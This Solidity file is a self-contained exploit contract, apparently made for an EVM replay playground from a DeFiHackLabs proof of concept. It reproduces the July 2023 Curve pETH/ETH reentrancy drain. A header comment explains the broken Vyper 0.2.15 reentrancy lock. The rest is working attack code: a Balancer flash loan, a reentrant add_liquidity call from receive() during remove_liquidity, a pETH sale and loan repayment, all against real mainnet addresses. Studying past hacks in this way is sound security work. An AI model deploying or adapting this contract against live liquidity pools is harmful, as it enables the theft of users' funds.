// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2023-07-Curve_exp01).
// The DeFiHackLabs PoC runs the whole attack INLINE in the Foundry test
// contract (ContractTest IS the test; the Balancer flash-loan callback
// `receiveFlashLoan` AND the native-ETH `receive()` reentrancy callback both
// live on the test itself), so there is no standalone exploit contract to
// deploy. This contract is a faithful, self-contained copy of that inline
// attack (testExploit -> run, receiveFlashLoan/receive unchanged) so the
// playground can deploy it and record run(). Logic and constants are copied
// verbatim from test/Curve_exp01.sol.
//
// Root cause: this Curve StableSwap pETH/ETH pool is written in Vyper 0.2.15.
// Every state-mutating entry point (add_liquidity, exchange, remove_liquidity)
// carries an `@nonreentrant('lock')` decorator that is supposed to make them
// mutually exclusive -- but the Vyper 0.2.15/0.2.16/0.3.0 compiler emits
// broken bytecode for that guard, so the lock is silently a no-op across
// functions that share the same lock key. remove_liquidity() pays out the
// native-ETH leg via a raw_call to `_receiver` (handing control to an
// attacker contract) AFTER debiting `self.balances[0]` but BEFORE writing the
// decremented `self.totalSupply` -- so a reentrant add_liquidity() mints LP
// against a half-updated pool (reduced balances, stale totalSupply),
// producing far more LP than the ETH deposited for. This is one leg of the
// broader July 30, 2023 Curve/Vyper reentrancy incident (~$41M total lost
// across multiple pools); this PoC drains ~6,107.41 WETH from the pETH/ETH
// pool alone.

interface IWETH {
    function deposit() external payable;
    function withdraw(uint256 wad) external;
    function balanceOf(address) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface ICurve {
    function exchange(int128 i, int128 j, uint256 dx, uint256 min_dy) external payable returns (uint256);
    function add_liquidity(uint256[2] memory amounts, uint256 min_mint_amount) external payable returns (uint256);
    function remove_liquidity(uint256 token_amount, uint256[2] memory min_amounts) external;
}

interface IBalancerVault {
    function flashLoan(address recipient, address[] memory tokens, uint256[] memory amounts, bytes memory userData)
        external;
}

contract CurvePethDrain {
    IWETH private constant WETH = IWETH(payable(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2));
    IERC20 private constant pETH = IERC20(0x836A808d4828586A69364065A1e064609F5078c7);
    IERC20 private constant LP = IERC20(0x9848482da3Ee3076165ce6497eDA906E66bB85C5);
    ICurve private constant CurvePool = ICurve(0x9848482da3Ee3076165ce6497eDA906E66bB85C5);
    IBalancerVault private constant Balancer = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);

    uint256 private nonce;

    // step 0: flashloan 80,000 WETH from Balancer (0 fee); receiveFlashLoan does the drain.
    function run() external {
        address[] memory tokens = new address[](1);
        tokens[0] = address(WETH);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 80_000 ether;
        bytes memory userData = "";
        Balancer.flashLoan(address(this), tokens, amounts, userData);
    }

    function receiveFlashLoan(
        address[] memory, /*tokens*/
        uint256[] memory, /*amounts*/
        uint256[] memory, /*feeAmounts*/
        bytes memory /*userData*/
    ) external {
        // step 1: unwrap the whole flash-loaned WETH position to native ETH.
        WETH.withdraw(WETH.balanceOf(address(this)));

        // step 2: deposit 40,000 ETH as liquidity -- mints the initial LP position.
        uint256[2] memory amount;
        amount[0] = 40_000 ether;
        amount[1] = 0;
        CurvePool.add_liquidity{value: 40_000 ether}(amount, 0);

        // step 3: REENTRANCY ENTER POINT. remove_liquidity's native-ETH leg pays
        // out via a raw_call to us mid-function -- after self.balances[0] is
        // already debited but before self.totalSupply is written. The broken
        // Vyper 0.2.15 @nonreentrant('lock') guard does not block our receive()
        // from re-entering add_liquidity() against this half-updated state.
        amount[0] = 0;
        CurvePool.remove_liquidity(LP.balanceOf(address(this)), amount);
        nonce++;

        // step 4: burn a further chunk of the now-inflated LP position for more ETH/pETH.
        CurvePool.remove_liquidity(10_272 ether, amount);

        // step 5: wrap the accumulated native ETH back to WETH.
        WETH.deposit{value: address(this).balance}();

        // step 6: sell the accumulated pETH leg back into ETH via the pool.
        pETH.approve(address(CurvePool), pETH.balanceOf(address(this)));
        CurvePool.exchange(1, 0, pETH.balanceOf(address(this)), 0);

        // step 7: wrap the final native ETH proceeds back to WETH.
        WETH.deposit{value: address(this).balance}();

        // step 8: repay the 80,000 WETH flash loan; whatever WETH remains is the profit.
        WETH.transfer(address(Balancer), 80_000 ether);
    }

    // Reentrancy callback: fires when the pool's remove_liquidity() raw_call
    // pushes native ETH to us (coin 0) mid-function. Nonce-gated so it only
    // re-enters on the FIRST such payout (matches the historical attack).
    receive() external payable {
        if (msg.sender == address(CurvePool) && nonce == 0) {
            uint256[2] memory amount;
            amount[0] = 40_000 ether;
            amount[1] = 0;
            CurvePool.add_liquidity{value: 40_000 ether}(amount, 0);
        }
    }
}
